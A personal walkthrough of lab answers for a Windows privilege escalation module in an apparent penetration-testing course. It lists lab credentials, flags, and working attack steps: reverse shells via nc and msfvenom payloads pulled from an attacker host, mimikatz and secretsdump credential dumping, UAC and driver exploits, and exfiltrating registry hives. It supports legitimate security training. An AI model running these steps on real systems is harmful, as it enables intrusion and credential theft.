---
title: CPTS labs - 25 Windows Privilege Escalation
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 25 Windows Privilege Escalation

## Getting the Lay of the Land

**RDP to (ACADEMY-WINLPE-SRV01) with user "htb-student" and password "HTB_@cademy_stdnt!". What is the IP address of the other NIC attached to the target host?**

``` powershell
ipconfig /all
```

Results: 172.16.20.45

**What executable other than cmd.exe is blocked by AppLocker?**

We list the AppLocker Rules:

``` powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Results: powershell_ise.exe





**What non-default privilege does the htb-student user have?**

```powershell
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

Results: SeTakeOwnershipPrivilege

**Who is a member of the Backup Operators group?**

```powershell
net localgroup "Backup Operators"
```

Results: sarah


**What service is listening on port 8080 (service name not the executable)?**

```powershell
tasklist /svc
```

Results: Tomcat8


**What user is logged in to the target host?**

```powershell
query user
```

Results:  sccm_svc


**What type of session does this user have?**

```powershell
query user
```

Results:  console


**What service is listening on 0.0.0.0:21? (two words)**

```
tasklist /svc
```

Results: FileZilla Server

**Which account has WRITE_DAC privileges over the \pipe\SQLLocal\SQLEXPRESS01 named pipe?**

```
.\accesschk.exe -accepteula -w \pipe\SQLLocal\SQLEXPRESS01 -v
```

Results: NT SERVICE\MSSQL$SQLEXPRESS01


## Windows User Privileges

Authenticate to  with user "sql_dev" and password "Str0ng_P@ssw0rd!". Escalate privileges using one of the methods shown in this section. Submit the contents of the flag file located at c:\Users\Administrator\Desktop\SeImpersonate\flag.txt

```
# As I was not able to RDP using the sql_dev account. I connected with htb-student and ran cmd as sql_dev.
xfreerdp /v:10.129.43.43 /u:sql_dev /p:'Str0ng_P@ssw0rd!' /cert:ignore

# Another alternative:
mssqlclient.py sql_dev@10.129.43.43 -windows-auth
# Enter password: Str0ng_P@ssw0rd

# Enabling xp_cmdshell
enable_xp_cmdshell

# Checking Account Privileges
xp_cmdshell whoami /priv
```

As SeImpersonatePrivilege is listed, we may impersonate a privileged account such as NT AUTHORITY\SYSTEM.

To escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. But this is already saved in the C:\Tools folder. So we will jump to the next step, start a Netcat listener on port 8443 from your attacking machine:

```
nc -lnvp 8443
```

Execute the command below where -l is the COM server listening port, -p is the program to launch (cmd.exe), -a is the argument passed to cmd.exe, and -t is the createprocess call. Below, we are telling the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively.

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.49 8443 -e cmd.exe" -t *
```

Cat the flag:

```
type c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
```

Results: F3ar_th3_p0tato!

**RDP to  with user "jordan" and password "HTB_@cademy_j0rdan!". Leverage SeDebugPrivilege rights and obtain the NTLM password hash for the sccm_svc account.**

```
xfreerdp /v:10.129.43.43 /u:jordan /p:HTB_@cademy_j0rdan! /cert:ignore

. .\psgetsys.ps1 
ImpersonateFromParentPid -ppid 612 -command "c:\Windows\System32\cmd.exe" -cmdargs ""

# Now we open mimikatz (in tools)
cd c:\Tools\mimikatz
# And browse to the tool
.\mimikatz.exe

# Impersonate as NT Authority/SYSTEM (having permissions for it).
token::elevate

# List users and hashes of the machine
lsadump::sam
```

Results: 64f12cddaa88057e06a81b54e73b949b


**RDP to (ACADEMY-WINLPE-SRV01) with user "htb-student" and password "HTB_@cademy_stdnt!". Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents.**

```
xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.43.43 /cert:ignore  
# Check permissions
whoami /priv

# In the output we can see SeTakeOwnershipPrivilege is disabled. We will use the Enable-Privilege.ps1 and the EnableAllTokenPrivs.ps1 scripts to enable it.

```

See the scripts  in [windows-user-privileges](windows-user-privileges.md)

```
# Run the scripts to enable the SeTakeOwnershipPrivilege
Import-module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

And now it is enabled.

```
# Check out the target file to gather a bit more information about it.
Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

# Checking File Ownership:
cmd /c dir /q 'C:\TakeOwn\'

# Taking Ownership of the File:
takeown /f 'C:\TakeOwn\flag.txt'

# Confirm change of ownership:
Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

# We need to modify ACL to get to read the file.
icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F

# Print out the file
type 'C:\TakeOwn\flag.txt'
```

Results: 1m_th3_f1l3_0wn3r_n0W!


## Windows Group Privileges

RDP to  with user "svc_backup" and password "HTB_@cademy_stdnt!". Leverage SeBackupPrivilege rights and obtain the flag located at c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt

```
xfreerdp /v:10.129.43.42 /u:svc_backup /p:HTB_@cademy_stdnt! /cert:ignore

# Check privs and group memberships:
whoami /priv
whoami /groups

# If SeBackupPrivilege is present, double check if it is enabled:
Get-SeBackupPrivilege

# If disabled, enable it (and check it back):
Set-SeBackupPrivilege
Get-SeBackupPrivilege
whoami /priv

# Copy the file
Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt

type flag.txt
```

Results: Car3ful_w1th_gr0up_m3mberSh1p! 


**RDP to  with user "logger" and password "HTB_@cademy_stdnt!" Using the methods demonstrated in this section find the password for the user mary.**

```
xfreerdp /v:10.129.43.43 /u:logger /p:HTB_@cademy_stdnt! /cert:ignore

# Confirming Group Membership
net localgroup "Event Log Readers"

# Also
whoami /groups

# Searching Security Logs Using wevtutil (Windows Event Utility, used for querying and managing event logs):
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# qe Security → Queries the Security event log.
# /rd:true → Reads events in reverse order (starting from the most recent).
# /f:text  → Formats the output in plain text (instead of XML or JSON).
# | Select-String "/user" → Pipes (`|`) the output to `Select-String`, which **searches for lines containing** `"/user"`.
```

Results:  W1ntergreen_gum_2021!


**RDP to  with user "netadm" and password "HTB_@cademy_stdnt!". Leverage membership in the DnsAdmins group to escalate privileges. Submit the contents of the flag located at c:\Users\Administrator\Desktop\DnsAdmins\flag.txt**

```
xfreerdp /v:10.129.43.42 /u:netadm /p:HTB_@cademy_stdnt! /cert:ignore

# Go to c:\Tools and you directly will see the adduser.dll. Otherwise, to generate it:


# Generating Malicious DLL to add a user to the domain admins group using msfvenom from your attacking machine:
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# Starting Local HTTP Server: 
python3 -m http.server 7777

# Downloading File to Target machine:
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"

# Loading this DLL as a normal user isn't successful. Only members of the `DnsAdmins` group are permitted to do this. 
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

# With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.
wmic useraccount where name="netadm" get sid
sc.exe sdshow DNS


# Stopping and starting the DNS Service
sc.exe stop dns
sc.exe start dns

# Confirming Group Membership
net group "Domain Admins" /dom

# However, your session is still running at `Medium Mandatory Level`, which indicates you haven’t fully inherited the **Domain Admin** privileges yet.
logoff

# And when you connect back, you will be Domain Admin.
type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
```

Results: Dll_abus3_ftw!  

**RDP to  with user "printsvc" and password "HTB_@cademy_stdnt!". Follow the steps in this section to escalate privileges to SYSTEM, and submit the contents of the flag.txt file on administrator's Desktop. Necessary tools for both methods can be found in the C:\Tools directory, or you can practice compiling and uploading them on your own.**

```
xfreerdp /v:10.129.217.105 /u:printsvc /p:HTB_@cademy_stdnt! /cert:ignore
```

Check our group membershipts:

```powershell
whoami /groups
```

We see Print Operators, which usually has the SeLoadDriverPrivilege. However when we check our permissions is not listed:

```powershell
whoami /priv
```


If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC. 
	- You can bypass it with  [UACMe](https://github.com/hfiref0x/UACME) repo features or any similar code approach.
	- You can also bypass it from user interface. Open a powershell with administrator permissions. 	

 If disabled, enabled SeLoadDriverPrivilege. Now, next troubleshooting is that the `SeLoadDriverPrivilege` may be Disabled. To enable it, we will need the following:

- The executable `EnableSeLoadDriverPrivilege.exe` that we can compile using the forked repo [https://github.com/amandaguglieri/enabling-privileges](https://github.com/amandaguglieri/enabling-privileges).  
- The file Capcom.sys. I've forked it to [https://github.com/amandaguglieri/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/amandaguglieri/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- The DriverView.exe utility, officially available at [https://www.nirsoft.net/utils/driverview.html](https://www.nirsoft.net/utils/driverview.html) and in my case, also uploaded to [my repo](https://github.com/amandaguglieri/hackinglife/blob/main/docs/files/DriverView.exe).

Compiling `EnableSeLoadDriverPrivilege.exe` . I've set up Visual Studio 2022 in a Windows Virtual Machine. 


```
# Clone my forked repo
https://github.com/amandaguglieri/enabling-privileges

# Add the following libraries to the EnableSeLoadDriverPrivilege.cpp file
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#pragma comment(lib,"advapi32.lib") 
#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"Ntdll.lib")
#include <stdio.h>
#include "tchar.h"

# Now, from the terminal (CTRL+ñ), compile:
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
# This will generate the required EnableSeLoadDriverPrivilege.exe. Save it to the folder from where you want to serve the payload to the target host.
```

Download the other required files (`Capcom.sys`  and `DriverView.exe`) to the folder from where you want to serve the payload to the target host.

```
# Download Capcom.sys
wget https://github.com/amandaguglieri/enabling-privileges/blob/master/Capcom.sys

# Download DriverView.exe
wget https://github.com/amandaguglieri/hackinglife/blob/main/docs/files/DriverView.exe
```

Serve the files to the target host:

```
python3 -m http.server 80
```

Download the files to the target host:

```powershell
# open a powershell terminal and change the directory for instance to C:\Tools
cd C:\Tools
wget http://10.10.14.39/EnableSeLoadDriverPrivilege.exe -outfile EnableSeLoadDriverPrivilege.exe
wget http://10.10.14.39/Capcom.sys -outfile Capcom.sys
wget http://10.10.14.39/DriverView.exe -outfile DriverView.exe
```

Save the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\test`. If test does not exist, create it:

```powershell
mkdir c:\test
copy Capcom.sys c:\test\Capcom.sys
```

Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.

```powershell
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

Run the `EnableSeLoadDriverPrivilege.exe` binary.

```powershell
.\EnableSeLoadDriverPrivilege.exe
```

The Output should be something like this:

```powershell
whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
```

Next, verify that the Capcom driver is now listed.

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

The output should be something like this:

```
Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

Now we will use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool for escalating privileges. I've cloned it into a windows virtual machine with Visual Studio 2022 installed (in my kali machine)

- Open Visual Studio 2022. Clone the project. Once cloned, right click and select "Compile". It's important to change the architecture to x64 in order to compile.
- Executable generated under "C:\Users\vboxuser\source\repos\ExploitCapcom\ExploitCapcom\x64\Release"

Upload the `ExploitCapcom.exe` file to the target machine:

```
# from the attacking machine
python3 -m http.server 80

# from the target host
wget http://$attackingIP/ExploitCapcom.exe -outfile ExploitCapcom.exe
```

Run the binary:

```powershell
.\ExploitCapcom.exe
```

This launches a shell with SYSTEM privileges. Now we print the flag.txt:

```
type c:\Users\Administrator\Desktop
```

If for some reason you can not read it, copy the file in order to read it.

Results:  Pr1nt_0p3rat0rs_ftw!


**RDP to  with user "server_adm" and password "HTB_@cademy_stdnt!". Escalate privileges using the methods shown in this section and submit the contents of the flag located at c:\Users\Administrator\Desktop\ServerOperators\flag.txt**


```
xfreerdp /v:10.129.43.42 /u:server_adm /p:HTB_@cademy_stdnt! /cert:ignore
```

We can confirm that this service starts as SYSTEM using the sc.exe utility.

```powershell
sc.exe qc AppReadiness
```


**Checking Service Permissions with PsService:** We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service. `PsService` works much like the `sc` utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.

```powershell
c:\Tools\PsService.exe security AppReadiness
```

If we see in the output:

```
 [ALLOW] BUILTIN\Server Operators
 ```

This confirms that the Server Operators group has [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.

Checking Local Admin Group Membership to confirm that our target account is not present:

```powershell
net localgroup Administrators
```

**Modifying the Service Binary Path**: Let's change the binary path to execute a command which adds our current user to the default local administrators group.

```powershell
sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

**Starting the service fails**, which is expected.

```powershell
sc.exe start AppReadiness
```

**Confirming Local Admin Group Membership**:If we check the membership of the administrators group, we see that the command was executed successfully.

```powershell
net localgroup Administrators
```

**Confirming Local Admin Access on Domain Controller**: From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.

```
crackmapexec smb 10.129.43.42 -u server_adm -p 'HTB_@cademy_stdnt!'
```

Output:

```
SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```


Retrieving NTLM Password Hashes from the Domain Controller:

```bash
secretsdump.py server_adm@10.129.43.42 -just-dc-user administrator
```

Returning all ntdi:

```
crackmapexec smb  10.129.172.26 -u Administrator -H 7796ee39fd3a9c3a1844556115ae1a54 -d INLANEFREIGHT.LOCAL --ntds   
```

Printing the flag:

```
crackmapexec smb  10.129.172.26 -u Administrator -H 7796ee39fd3a9c3a1844556115ae1a54 -d INLANEFREIGHT.LOCAL -x 'type "c:\Users\Administrator\Desktop\ServerOperators\flag.txt"' --exec-method smbexec
```

Results: S3rver_0perators_@ll_p0werfull!



## Attacking the OS


**RDP to  with user "sarah" and password "HTB_@cademy_stdnt!". Follow the steps in this section to obtain a reverse shell connection with normal user privileges and another which bypasses UAC. Submit the contents of flag.txt on the sarah user's Desktop when finished.**

```
xfreerdp /v:10.129.236.233 /u:sarah /p:HTB_@cademy_stdnt! /cert:ignore
```


**Reviewing User Privileges:**

```cmd-session
whoami /priv
```

**Confirming UAC is Enabled:**

```cmd-session
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

Output:

```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```

REG_DWORD 0x1: The value 1 means UAC is turned ON.

**Checking UAC Level**:

```cmd-session
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

Output:

```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled. There are fewer UAC bypasses at this highest level.

**Checking Windows Version:**

```powershell
[environment]::OSVersion.Version
```

Output:

```

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

To match the Build with the version see: [https://en.wikipedia.org/wiki/Windows_10_version_history](https://en.wikipedia.org/wiki/Windows_10_version_history)


The 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.

When attempting to locate a DLL, Windows will use the following search order.

1. The directory from which the application loaded.
2. The system directory `C:\Windows\System32` for 64-bit systems.
3. The 16-bit system directory `C:\Windows\System` (not supported on 64-bit systems)
4. The Windows directory.
5. Any directories that are listed in the PATH environment variable.

**Reviewing Path Variable**

```powershell
cmd /c echo %PATH%
```

This reveals the default folders below.

If we see a folder within the user's profile and writable by the user (in the example, the `WindowsApps` folder), we can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.

**Generating Malicious srrstr.dll DLL**

```shell-session
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

**Starting Python HTTP Server on Attack Host**

```shell-session
sudo python3 -m http.server 8080
```

**Downloading DLL Target**: Download the malicious DLL to the target system.

```powershell
curl http://10.10.14.158:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

Note that we will be using the path of the writable folder that is included within the PATH variable.

**Starting nc Listener on Attack Host**

```shell-session
nc -lvnp 8443
```

**Executing SystemPropertiesAdvanced.exe on Target Host**: Before proceeding, we should ensure that any instances of the rundll32 process from our previous execution have been terminated.

```cmd
tasklist /svc | findstr "rundll32"
```

Output:

```cmd
rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A
```

Therefore, killing the processes:

```cmd
taskkill /PID 7044 /F
taskkill /PID 6300 /F
taskkill /PID 5360 /F
```

Now, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host (don't forget to previously set the listener):

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

Print the flag:

```
cat c:\Users\sarah\Desktop\flag.txt
```

Results: I_bypass3d_Uac!


**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Escalate privileges on the target host using the techniques demonstrated in this section. Submit the contents of the flag in the WeakPerms folder on the Administrator Desktop.**

```
xfreerdp /v:10.129.54.144 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

We can use [SharpUp](sharpup.md) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.

```powershell
.\SharpUp.exe audit
```

In the example, the tool identifies the `PC Security Management Service`, which executes the `SecurityService.exe` binary when started.

**Checking Permissions with icacls**: Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

```powershell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Output:

```
C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

**Replacing Service Binary**:  This service is also startable by unprivileged users.  We will:

1. make a backup of the original binary
2. Create a malicious binary with msfvenom
3. Download it in the target host and replace the original
4. Set a listener
5. Establish the connection

We can make a backup of the original binary: 

```cmd-session
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Create  a malicious binary generated with `msfvenom` in out attacking machine:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.158 LPORT=8443 -f exe > SecurityService.exe
```

Serve the malicious file:

```
python3 -m http.server 8080
```

Download it from the target host to the needed location:

```
curl http://10.10.14.158:8080/SecurityService.exe -O "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Set a listener:

```bash
Aud1t_th0se_s3rv1ce_p3rms!
```

Launch the service and get a reverse shell: 

```powershell
sc.exe start SecurityService
```

Print the flag:

```powershell
type c:\Users\Administrator\Desktop\WeakPerms\flag.txt
```

Results: Aud1t_th0se_s3rv1ce_p3rms!



**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Try out the 3 examples in this section to escalate privileges to NT AUTHORITY\SYSTEM on the target host. Submit the contents of the flag on the Administrator Desktop.**

```
xfreerdp /v:10.129.43.13 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

We can check for this vulnerability using icacls to check permissions on the SAM file. 

```cmd-session
icacls c:\Windows\System32\config\SAM
```

Output:

```
C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Users:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

In our case, we have a vulnerable version as the file is readable by the BUILTIN\Users group.

Successful exploitation also requires the presence of one or more shadow copies. Most Windows 10 systems will have System Protection enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw.

**Performing Attack and Parsing Password Hashes**:  We will use the POC `https://github.com/GossiTheDog/HiveNightmare`.

```bash
git clone https://github.com/GossiTheDog/HiveNightmare.git
cd HiveNightmare/Release
python3 -m http.server 8080
```

From the target host:

```
curl http://10.10.14.158:8080/HiveNightmare.exe -O "C:\Tools\HiveNightmare.exe"      
```

And now:

```powershell 
.\HiveNightmare.exe
```

This will create these copies:

```
65536 SAM-2021-08-09
32768 SECURITY-2021-08-09
12582912 SYSTEM-2021-08-09
```

Now, we can transfer them yo our attacking machine, for instance by using the PSUpload.ps1 script:

```powershell
<#

PowerShell Script to upload files using uploadserver module 
Github: https://github.com/Densaugeo/uploadserver

To execute the server run in your Linux Machine:
pip3 install uploadserver
python3 -m uploadserver

Example PS:
Invoke-FileUpload -File C:\Users\plaintext\Desktop\20200717080254_BloodHound.zip -Uri http://192.168.49.128:8000/upload

References: https://gist.github.com/arichika/91a8b1f60c87512401e320a614099283

#>

function Invoke-FileUpload {
	Param (
		[Parameter(Position = 0, Mandatory = $True)]
		[String]$File,
		
		[Parameter(Position = 1, Mandatory = $True)]
		[String]$Uri
		)
	
	$FileToUpload = Get-ChildItem -File "$File"
	
	$UTF8woBOM = New-Object "System.Text.UTF8Encoding" -ArgumentList @($false)
	$boundary = '----BCA246E0-E2CF-48ED-AACE-58B35D68B513'
	$tempFile = New-TemporaryFile
	Remove-Item $tempFile -Force -ErrorAction Ignore
	$sw = New-Object System.IO.StreamWriter($tempFile, $true, $UTF8woBOM)
	$fileName = [System.IO.Path]::GetFileName($FileToUpload.FullName)
	$sw.Write("--$boundary`r`nContent-Disposition: form-data;name=`"files`";filename=`"$fileName`"`r`n`r`n")
	$sw.Close()
	$fs = New-Object System.IO.FileStream($tempFile, [System.IO.FileMode]::Append)
	$bw = New-Object System.IO.BinaryWriter($fs)
	$fileBinary = [System.IO.File]::ReadAllBytes($FileToUpload.FullName)
	$bw.Write($fileBinary)
	$bw.Close()
	$sw = New-Object System.IO.StreamWriter($tempFile, $true, $UTF8woBOM)
	$sw.Write("`r`n--$boundary--`r`n")
	$sw.Close()
	
	Invoke-RestMethod -Method POST -Uri $uri -ContentType "multipart/form-data; boundary=$boundary" -InFile $tempFile
	
	$FileHash = Get-FileHash -Path "$File" -Algorith MD5 
	Write-Host "[+] File Uploaded: " $FileToUpload.FullName
	Write-Host "[+] FileHash: " $FileHash.Hash
}                                

```

By default, Windows prevents running `.ps1` scripts for security reasons unless explicitly allowed.

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

Then:

```powershell
. .\PSUpload.ps1
```

Now in the attacker machine:

```
python -m uploadserver
```

This will create a listening server at port 8000.

And from the target host:

```
Invoke-FileUpload -Uri http://10.10.14.158:8000/upload -File "C:\Tools\SAM-2021-08-09"
Invoke-FileUpload -Uri http://10.10.14.158:8000/upload -File "C:\Tools\SECURITY-2021-08-09"
Invoke-FileUpload -Uri http://10.10.14.158:8000/upload -File "C:\Tools\SYSTEM-2021-08-09"
```

Now we can use  impacket-secretsdump to extract the hashes:

```shell-session
secretsdump.py -sam SAM-2021-08-09 -system SYSTEM-2021-08-09 -security SECURITY-2021-08-09 local
```

And the output:

```
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[*] Target system bootKey: 0xebb2121de07ed08fc7dc58aa773b23d6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c93428723187f868ae2f99d4fa66dceb:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
hacker:1003:aad3b435b51404eeaad3b435b51404ee:657cc99ace25cc19c7d2902f26fb826d:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3c7b7e66890fb2181a74bb56ab12195f248e9461
dpapi_userkey:0xc3e6491e75d7cffe8efd40df94d83cba51832a56
[*] NL$KM 
 0000   45 C5 B2 32 29 8B 05 B8  E7 E7 E0 4B 2C 14 83 02   E..2)......K,...
 0010   CE 2F E7 D9 B8 E0 F0 F8  20 C8 E4 70 DD D1 7F 4F   ./...... ..p...O
 0020   42 2C E6 9E AF 57 74 01  09 88 B3 78 17 3F 88 54   B,...Wt....x.?.T
 0030   52 8F 8D 9C 06 36 C0 24  43 B9 D8 0F 35 88 B9 60   R....6.$C...5..`
NL$KM:45c5b232298b05b8e7e7e04b2c148302ce2fe7d9b8e0f0f820c8e470ddd17f4f422ce69eaf5774010988b378173f8854528f8d9c0636c02443b9d80f3588b960
[*] Cleaning up... 
```

Now we can use other tools for continuing the exploitation. For instance:

```
crackmapexec smb  10.129.43.13 -u Administrator -H 7796ee39fd3a9c3a1844556115ae1a54 -d INLANEFREIGHT.LOCAL --sam  
```

Print the flag:

```
crackmapexec smb  10.129.43.13 -u Administrator -H 7796ee39fd3a9c3a1844556115ae1a54 -d INLANEFREIGHT.LOCAL -x  'type "c:\Users\Administrator\Desktop\flag.txt"' --exec-method smbexec
```

Results: D0nt_fall_b3h1nd_0n_Patch1ng!


**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Work through the steps above to escalate privileges on the target system using the Druva inSync flaw. Submit the contents of the flag in the VulServices folder on the Administrator Desktop.**

```
xfreerdp /v:10.129.159.202 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

Enumerating Installed Programs

```cmd
wmic product get name
```

Example of output:

```
Name                                                                        Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910 
Update for Windows 10 for x64-based Systems (KB4023057) 
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127 
VMware Tools  
Druva inSync 6.6.3            
Microsoft Update Health Tools 
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910 
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127     
```

The output looks mostly standard for a Windows 10 workstation. However, the `Druva inSync` application stands out. A quick Google search shows that version `6.6.3` is vulnerable to a command injection attack via an exposed RPC service. We may be able to use [this](https://www.exploit-db.com/exploits/49211) exploit PoC to escalate our privileges. From this [blog post](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/) which details the initial discovery of the flaw, we can see that Druva inSync is an application used for “Integrated backup, eDiscovery, and compliance monitoring,” and the client application runs a service in the context of the powerful `NT AUTHORITY\SYSTEM` account. Escalation is possible by interacting with a service running locally on port 6064.

Enumerating Local Ports

```cmd-session
netstat -ano | findstr 6064
```

Example of output:

```
  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3468
  TCP    127.0.0.1:6064         127.0.0.1:52496        ESTABLISHED     3468
